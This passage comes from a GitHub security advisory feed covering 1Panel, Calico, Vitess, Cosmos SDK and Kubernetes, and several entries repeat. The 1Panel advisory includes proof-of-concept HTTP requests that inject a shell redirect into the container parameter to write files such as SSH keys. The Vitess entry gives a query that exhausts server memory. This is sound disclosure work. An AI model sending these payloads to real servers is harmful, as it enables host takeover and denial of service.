<li><a href="https://github.com/tiagorlampert/CHAOS/commit/1b451cf62582295b7225caf5a7b506f0bad56f6b">https://github.com/tiagorlampert/CHAOS/commit/1b451cf62582295b7225caf5a7b506f0bad56f6b</a></li>
<li><a href="https://github.com/tiagorlampert/CHAOS/commit/24c9e109b5be34df7b2bce8368eae669c481ed5e">https://github.com/tiagorlampert/CHAOS/commit/24c9e109b5be34df7b2bce8368eae669c481ed5e</a></li>
<li><a href="https://github.com/tiagorlampert/CHAOS/commit/b47438d36e3ad746de8c009e644f6e5396703f25">https://github.com/tiagorlampert/CHAOS/commit/b47438d36e3ad746de8c009e644f6e5396703f25</a></li>
<li><a href="https://github.com/advisories/GHSA-xfjj-f699-rc79">https://github.com/advisories/GHSA-xfjj-f699-rc79</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xfjj-f699-rc79</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-07T15:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/1Panel-dev/1Panel] 1Panel arbitrary file write vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-f8ch-w75v-c847</id>
        <link href="https://github.com/advisories/GHSA-f8ch-w75v-c847"/>
        <updated>2024-05-09T15:14:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There are many command injections in the project, and some of them are not well filtered, leading to arbitrary file writes, and ultimately leading to RCEs.
We can use the following mirror configuration write symbol <code>&gt;</code> to achieve arbitrary file writing</p>
<h3 id="poc">PoC</h3>
<p>Dockerfile</p>
<pre><code>FROM bash:latest

COPY echo.sh /usr/local/bin/echo.sh
RUN chmod +x /usr/local/bin/echo.sh
CMD ["echo.sh"]
</code></pre>
<p>echo.sh</p>
<pre><code>#!/usr/local/bin/bash
echo "Hello, World!"
</code></pre>
<p>Build this image like this, upload it to dockerhub, and then 1panel pulls the image to build the container
Send the following packet, taking care to change the containerID to the malicious container we constructed</p>
<pre><code>GET /api/v1/containers/search/log?container=6e6308cb8e4734856189b65b3ce2d13a69e87d2717898d120dac23b13b6f1377%3E%2Ftmp%2F1&amp;since=all&amp;tail=100&amp;follow=true HTTP/1.1
Host: xxxx:42713
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Upgrade: websocket
Origin: http://xxx:42713
Sec-WebSocket-Version: 13
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: psession=88e51389-ddce-468c-a3be-51c5b2cb2d9d
Sec-WebSocket-Key: FdXBKFviqO4+LSEoucITLA==
</code></pre>
<p>Then you can write any customized file to, for example, a ssh key, and generally the application is run with root privileges</p>
<pre><code>GET /api/v1/containers/search/log?container=6e6308cb8e4734856189b65b3ce2d13a69e87d2717898d120dac23b13b6f1377%3E%2Froot%2F.ssh%2f1&amp;since=all&amp;tail=100&amp;follow=true HTTP/1.1
Host: xxx:42713
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Upgrade: websocket
Origin: http://xxx:42713
Sec-WebSocket-Version: 13
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: psession=88e51389-ddce-468c-a3be-51c5b2cb2d9d
Sec-WebSocket-Key: FdXBKFviqO4+LSEoucITLA==
</code></pre>
<p>Or write a timed task to execute any command.</p>
<h3 id="impact">Impact</h3>
<p>The ability to write arbitrary files on the host where the service is deployed can lead to a host takeover</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-f8ch-w75v-c847">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-f8ch-w75v-c847</a></li>
<li><a href="https://github.com/advisories/GHSA-f8ch-w75v-c847">https://github.com/advisories/GHSA-f8ch-w75v-c847</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f8ch-w75v-c847</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-09T15:14:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/projectcalico/calico] Exposure of Sensitive Information to an Unauthorized Actor and Insertion of Sensitive Information Into Sent Data in Calico]]></title>
        <id>https://github.com/advisories/GHSA-pf59-j7c2-rh6x</id>
        <link href="https://github.com/advisories/GHSA-pf59-j7c2-rh6x"/>
        <updated>2024-05-08T18:52:33.000Z</updated>
        <content type="html"><![CDATA[<p>Clusters using Calico (version 3.14.0 and below), Calico Enterprise (version 2.8.2 and below), may be vulnerable to information disclosure if IPv6 is enabled but unused. A compromised pod with sufficient privilege is able to reconfigure the nodeâs IPv6 interface due to the node accepting route advertisement by default, allowing the attacker to redirect full or partial network traffic from the node to the compromised pod.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-13597">https://nvd.nist.gov/vuln/detail/CVE-2020-13597</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/91507">https://github.com/kubernetes/kubernetes/issues/91507</a></li>
<li><a href="https://github.com/containernetworking/plugins/commit/ad10b6fa91aacd720f1f9ab94341a97a82a24965">https://github.com/containernetworking/plugins/commit/ad10b6fa91aacd720f1f9ab94341a97a82a24965</a></li>
<li><a href="https://groups.google.com/forum/#!topic/kubernetes-security-announce/BMb_6ICCfp8">https://groups.google.com/forum/#!topic/kubernetes-security-announce/BMb_6ICCfp8</a></li>
<li><a href="https://github.com/containernetworking/plugins/pull/484">https://github.com/containernetworking/plugins/pull/484</a></li>
<li><a href="https://www.projectcalico.org/security-bulletins">https://www.projectcalico.org/security-bulletins</a></li>
<li><a href="https://github.com/advisories/GHSA-pf59-j7c2-rh6x">https://github.com/advisories/GHSA-pf59-j7c2-rh6x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pf59-j7c2-rh6x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-02-15T01:57:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/vitessio/vitess] Vitess vulnerable to infinite memory consumption and vtgate crash]]></title>
        <id>https://github.com/advisories/GHSA-649x-hxfx-57j2</id>
        <link href="https://github.com/advisories/GHSA-649x-hxfx-57j2"/>
        <updated>2024-05-10T21:33:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When executing the following simple query, the <code>vtgate</code> will go into an endless loop that also keeps consuming memory and eventually will OOM.</p>
<h3 id="details">Details</h3>
<p>When running the following query, the <code>evalengine</code> will try evaluate it and runs forever.</p>
<pre><code>select _utf16 0xFF
</code></pre>
<p>The source of the bug lies in the collation logic that we have. The bug applies to all <code>utf16</code>,  <code>utf32</code> and <code>ucs2</code> encodings.  In general, the bug is there for any encoding where the minimal byte length for a single character is more than 1 byte.</p>
<p>The decoding functions for these collations all implement logic like the following to enforce the minimal character length:</p>
<p><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71</a></p>
<p>The problem is that all the callers of <code>DecodeRune</code> expect progress by returning the number of bytes consumed. This means that if there's only 1 byte left in an input, it will here return still <code>0</code> and the caller(s) don't consume the character. </p>
<p>One example of such a caller is the following:</p>
<p><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79</a></p>
<p>The logic here moves forward the pointer in the input <code>[]byte</code> but if <code>DecodeRune</code> returns <code>0</code> in case of error, it will keep running forever. The OOM happens since it keeps adding the <code>?</code> as the invalid character to the destination buffer infinitely, growing forever until it runs out of memory.</p>
<p>The fix here would be to always return forward progress also on invalid strings. </p>
<p>There's also a separate bug here that even if progress is guaranteed, <code>select _utf16 0xFF</code> will return the wrong result currently. MySQL will pad here the input when the <code>_utf16</code> introducer is used with leading <code>0x00</code> bytes and then decode to UTF-16, resulting in the output of <code>Ã¿</code> here. </p>
<h3 id="poc">PoC</h3>
<pre><code>select _utf16 0xFF
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of service attack by triggering unbounded memory usage.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitessio/vitess/security/advisories/GHSA-649x-hxfx-57j2">https://github.com/vitessio/vitess/security/advisories/GHSA-649x-hxfx-57j2</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/2fd5ba1dbf6e9b32fdfdaf869d130066b1b5c0df">https://github.com/vitessio/vitess/commit/2fd5ba1dbf6e9b32fdfdaf869d130066b1b5c0df</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/9df4b66550e46b5d7079e21ed0e1b0f49f92b055">https://github.com/vitessio/vitess/commit/9df4b66550e46b5d7079e21ed0e1b0f49f92b055</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/c46dc5b6a4329a10589ca928392218d96031ac8d">https://github.com/vitessio/vitess/commit/c46dc5b6a4329a10589ca928392218d96031ac8d</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/d438adf7e34a6cf00fe441db80842ec669a99202">https://github.com/vitessio/vitess/commit/d438adf7e34a6cf00fe441db80842ec669a99202</a></li>
<li><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79</a></li>
<li><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32886">https://nvd.nist.gov/vuln/detail/CVE-2024-32886</a></li>
<li><a href="https://github.com/advisories/GHSA-649x-hxfx-57j2">https://github.com/advisories/GHSA-649x-hxfx-57j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-649x-hxfx-57j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-08T14:32:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/vitessio/vitess] Vitess vulnerable to infinite memory consumption and vtgate crash]]></title>
        <id>https://github.com/advisories/GHSA-649x-hxfx-57j2</id>
        <link href="https://github.com/advisories/GHSA-649x-hxfx-57j2"/>
        <updated>2024-05-10T21:33:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When executing the following simple query, the <code>vtgate</code> will go into an endless loop that also keeps consuming memory and eventually will OOM.</p>
<h3 id="details">Details</h3>
<p>When running the following query, the <code>evalengine</code> will try evaluate it and runs forever.</p>
<pre><code>select _utf16 0xFF
</code></pre>
<p>The source of the bug lies in the collation logic that we have. The bug applies to all <code>utf16</code>,  <code>utf32</code> and <code>ucs2</code> encodings.  In general, the bug is there for any encoding where the minimal byte length for a single character is more than 1 byte.</p>
<p>The decoding functions for these collations all implement logic like the following to enforce the minimal character length:</p>
<p><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71</a></p>
<p>The problem is that all the callers of <code>DecodeRune</code> expect progress by returning the number of bytes consumed. This means that if there's only 1 byte left in an input, it will here return still <code>0</code> and the caller(s) don't consume the character. </p>
<p>One example of such a caller is the following:</p>
<p><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79</a></p>
<p>The logic here moves forward the pointer in the input <code>[]byte</code> but if <code>DecodeRune</code> returns <code>0</code> in case of error, it will keep running forever. The OOM happens since it keeps adding the <code>?</code> as the invalid character to the destination buffer infinitely, growing forever until it runs out of memory.</p>
<p>The fix here would be to always return forward progress also on invalid strings. </p>
<p>There's also a separate bug here that even if progress is guaranteed, <code>select _utf16 0xFF</code> will return the wrong result currently. MySQL will pad here the input when the <code>_utf16</code> introducer is used with leading <code>0x00</code> bytes and then decode to UTF-16, resulting in the output of <code>Ã¿</code> here. </p>
<h3 id="poc">PoC</h3>
<pre><code>select _utf16 0xFF
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of service attack by triggering unbounded memory usage.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitessio/vitess/security/advisories/GHSA-649x-hxfx-57j2">https://github.com/vitessio/vitess/security/advisories/GHSA-649x-hxfx-57j2</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/2fd5ba1dbf6e9b32fdfdaf869d130066b1b5c0df">https://github.com/vitessio/vitess/commit/2fd5ba1dbf6e9b32fdfdaf869d130066b1b5c0df</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/9df4b66550e46b5d7079e21ed0e1b0f49f92b055">https://github.com/vitessio/vitess/commit/9df4b66550e46b5d7079e21ed0e1b0f49f92b055</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/c46dc5b6a4329a10589ca928392218d96031ac8d">https://github.com/vitessio/vitess/commit/c46dc5b6a4329a10589ca928392218d96031ac8d</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/d438adf7e34a6cf00fe441db80842ec669a99202">https://github.com/vitessio/vitess/commit/d438adf7e34a6cf00fe441db80842ec669a99202</a></li>
<li><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79</a></li>
<li><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32886">https://nvd.nist.gov/vuln/detail/CVE-2024-32886</a></li>
<li><a href="https://github.com/advisories/GHSA-649x-hxfx-57j2">https://github.com/advisories/GHSA-649x-hxfx-57j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-649x-hxfx-57j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-08T14:32:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/vitessio/vitess] Vitess vulnerable to infinite memory consumption and vtgate crash]]></title>
        <id>https://github.com/advisories/GHSA-649x-hxfx-57j2</id>
        <link href="https://github.com/advisories/GHSA-649x-hxfx-57j2"/>
        <updated>2024-05-10T21:33:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When executing the following simple query, the <code>vtgate</code> will go into an endless loop that also keeps consuming memory and eventually will OOM.</p>
<h3 id="details">Details</h3>
<p>When running the following query, the <code>evalengine</code> will try evaluate it and runs forever.</p>
<pre><code>select _utf16 0xFF
</code></pre>
<p>The source of the bug lies in the collation logic that we have. The bug applies to all <code>utf16</code>,  <code>utf32</code> and <code>ucs2</code> encodings.  In general, the bug is there for any encoding where the minimal byte length for a single character is more than 1 byte.</p>
<p>The decoding functions for these collations all implement logic like the following to enforce the minimal character length:</p>
<p><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71</a></p>
<p>The problem is that all the callers of <code>DecodeRune</code> expect progress by returning the number of bytes consumed. This means that if there's only 1 byte left in an input, it will here return still <code>0</code> and the caller(s) don't consume the character. </p>
<p>One example of such a caller is the following:</p>
<p><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79</a></p>
<p>The logic here moves forward the pointer in the input <code>[]byte</code> but if <code>DecodeRune</code> returns <code>0</code> in case of error, it will keep running forever. The OOM happens since it keeps adding the <code>?</code> as the invalid character to the destination buffer infinitely, growing forever until it runs out of memory.</p>
<p>The fix here would be to always return forward progress also on invalid strings. </p>
<p>There's also a separate bug here that even if progress is guaranteed, <code>select _utf16 0xFF</code> will return the wrong result currently. MySQL will pad here the input when the <code>_utf16</code> introducer is used with leading <code>0x00</code> bytes and then decode to UTF-16, resulting in the output of <code>Ã¿</code> here. </p>
<h3 id="poc">PoC</h3>
<pre><code>select _utf16 0xFF
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of service attack by triggering unbounded memory usage.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitessio/vitess/security/advisories/GHSA-649x-hxfx-57j2">https://github.com/vitessio/vitess/security/advisories/GHSA-649x-hxfx-57j2</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/2fd5ba1dbf6e9b32fdfdaf869d130066b1b5c0df">https://github.com/vitessio/vitess/commit/2fd5ba1dbf6e9b32fdfdaf869d130066b1b5c0df</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/9df4b66550e46b5d7079e21ed0e1b0f49f92b055">https://github.com/vitessio/vitess/commit/9df4b66550e46b5d7079e21ed0e1b0f49f92b055</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/c46dc5b6a4329a10589ca928392218d96031ac8d">https://github.com/vitessio/vitess/commit/c46dc5b6a4329a10589ca928392218d96031ac8d</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/d438adf7e34a6cf00fe441db80842ec669a99202">https://github.com/vitessio/vitess/commit/d438adf7e34a6cf00fe441db80842ec669a99202</a></li>
<li><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79</a></li>
<li><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32886">https://nvd.nist.gov/vuln/detail/CVE-2024-32886</a></li>
<li><a href="https://github.com/advisories/GHSA-649x-hxfx-57j2">https://github.com/advisories/GHSA-649x-hxfx-57j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-649x-hxfx-57j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-08T14:32:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] Duplicate Advisory: Cosmos "Barberry" vulnerability in github.com/cosmos/cosmos-sdk]]></title>
        <id>https://github.com/advisories/GHSA-w44m-8mv2-v78h</id>
        <link href="https://github.com/advisories/GHSA-w44m-8mv2-v78h"/>
        <updated>2024-05-07T21:32:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="withdrawn">Withdrawn</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-j2cr-jc39-wpx5. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>The cosmos-sdk module is affected by the vulnerability codenamed "Barberry".</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/cosmos-sdk/pull/16466">https://github.com/cosmos/cosmos-sdk/pull/16466</a></li>
<li><a href="https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825">https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825</a></li>
<li><a href="https://github.com/advisories/GHSA-w44m-8mv2-v78h">https://github.com/advisories/GHSA-w44m-8mv2-v78h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w44m-8mv2-v78h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-22T20:01:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] Duplicate Advisory: Cosmos "Barberry" vulnerability in github.com/cosmos/cosmos-sdk]]></title>
        <id>https://github.com/advisories/GHSA-w44m-8mv2-v78h</id>
        <link href="https://github.com/advisories/GHSA-w44m-8mv2-v78h"/>
        <updated>2024-05-07T21:32:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="withdrawn">Withdrawn</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-j2cr-jc39-wpx5. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>The cosmos-sdk module is affected by the vulnerability codenamed "Barberry".</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/cosmos-sdk/pull/16466">https://github.com/cosmos/cosmos-sdk/pull/16466</a></li>
<li><a href="https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825">https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825</a></li>
<li><a href="https://github.com/advisories/GHSA-w44m-8mv2-v78h">https://github.com/advisories/GHSA-w44m-8mv2-v78h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w44m-8mv2-v78h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-22T20:01:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Privilege Escalation in Kubernetes]]></title>
        <id>https://github.com/advisories/GHSA-33c5-9fx5-fvjm</id>
        <link href="https://github.com/advisories/GHSA-33c5-9fx5-fvjm"/>
        <updated>2024-05-07T13:08:06.000Z</updated>
        <content type="html"><![CDATA[<p>The Kubernetes kube-apiserver in versions v1.6-v1.15, and versions prior to v1.16.13, v1.17.9 and v1.18.7 are vulnerable to an unvalidated redirect on proxied upgrade requests that could allow an attacker to escalate privileges from a node compromise to a full cluster compromise.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8559">https://nvd.nist.gov/vuln/detail/CVE-2020-8559</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/92914">https://github.com/kubernetes/kubernetes/issues/92914</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/92941">https://github.com/kubernetes/kubernetes/pull/92941</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1851422">https://bugzilla.redhat.com/show_bug.cgi?id=1851422</a></li>
<li><a href="https://github.com/tdwyer/CVE-2020-8559">https://github.com/tdwyer/CVE-2020-8559</a></li>
<li><a href="https://groups.google.com/d/msg/kubernetes-security-announce/JAIGG5yNROs/19nHQ5wkBwAJ">https://groups.google.com/d/msg/kubernetes-security-announce/JAIGG5yNROs/19nHQ5wkBwAJ</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/JAIGG5yNROs">https://groups.google.com/g/kubernetes-security-announce/c/JAIGG5yNROs</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20200810-0004">https://security.netapp.com/advisory/ntap-20200810-0004</a></li>
<li><a href="https://github.com/advisories/GHSA-33c5-9fx5-fvjm">https://github.com/advisories/GHSA-33c5-9fx5-fvjm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33c5-9fx5-fvjm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-24T20:01:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Privilege Escalation in Kubernetes]]></title>
        <id>https://github.com/advisories/GHSA-33c5-9fx5-fvjm</id>
        <link href="https://github.com/advisories/GHSA-33c5-9fx5-fvjm"/>
        <updated>2024-05-07T13:08:06.000Z</updated>
        <content type="html"><![CDATA[<p>The Kubernetes kube-apiserver in versions v1.6-v1.15, and versions prior to v1.16.13, v1.17.9 and v1.18.7 are vulnerable to an unvalidated redirect on proxied upgrade requests that could allow an attacker to escalate privileges from a node compromise to a full cluster compromise.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8559">https://nvd.nist.gov/vuln/detail/CVE-2020-8559</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/92914">https://github.com/kubernetes/kubernetes/issues/92914</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/92941">https://github.com/kubernetes/kubernetes/pull/92941</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1851422">https://bugzilla.redhat.com/show_bug.cgi?id=1851422</a></li>
<li><a href="https://github.com/tdwyer/CVE-2020-8559">https://github.com/tdwyer/CVE-2020-8559</a></li>
<li><a href="https://groups.google.com/d/msg/kubernetes-security-announce/JAIGG5yNROs/19nHQ5wkBwAJ">https://groups.google.com/d/msg/kubernetes-security-announce/JAIGG5yNROs/19nHQ5wkBwAJ</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/JAIGG5yNROs">https://groups.google.com/g/kubernetes-security-announce/c/JAIGG5yNROs</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20200810-0004">https://security.netapp.com/advisory/ntap-20200810-0004</a></li>
<li><a href="https://github.com/advisories/GHSA-33c5-9fx5-fvjm">https://github.com/advisories/GHSA-33c5-9fx5-fvjm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33c5-9fx5-fvjm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-24T20:01:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Privilege Escalation in Kubernetes]]></title>
        <id>https://github.com/advisories/GHSA-33c5-9fx5-fvjm</id>
        <link href="https://github.com/advisories/GHSA-33c5-9fx5-fvjm"/>
        <updated>2024-05-07T13:08:06.000Z</updated>
        <content type="html"><![CDATA[<p>The Kubernetes kube-apiserver in versions v1.6-v1.15, and versions prior to v1.16.13, v1.17.9 and v1.18.7 are vulnerable to an unvalidated redirect on proxied upgrade requests that could allow an attacker to escalate privileges from a node compromise to a full cluster compromise.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8559">https://nvd.nist.gov/vuln/detail/CVE-2020-8559</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/92914">https://github.com/kubernetes/kubernetes/issues/92914</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/92941">https://github.com/kubernetes/kubernetes/pull/92941</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1851422">https://bugzilla.redhat.com/show_bug.cgi?id=1851422</a></li>
<li><a href="https://github.com/tdwyer/CVE-2020-8559">https://github.com/tdwyer/CVE-2020-8559</a></li>
<li><a href="https://groups.google.com/d/msg/kubernetes-security-announce/JAIGG5yNROs/19nHQ5wkBwAJ">https://groups.google.com/d/msg/kubernetes-security-announce/JAIGG5yNROs/19nHQ5wkBwAJ</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/JAIGG5yNROs">https://groups.google.com/g/kubernetes-security-announce/c/JAIGG5yNROs</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20200810-0004">https://security.netapp.com/advisory/ntap-20200810-0004</a></li>
<li><a href="https://github.com/advisories/GHSA-33c5-9fx5-fvjm">https://github.com/advisories/GHSA-33c5-9fx5-fvjm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33c5-9fx5-fvjm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-24T20:01:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/apimachinery] Privilege Escalation in Kubernetes]]></title>
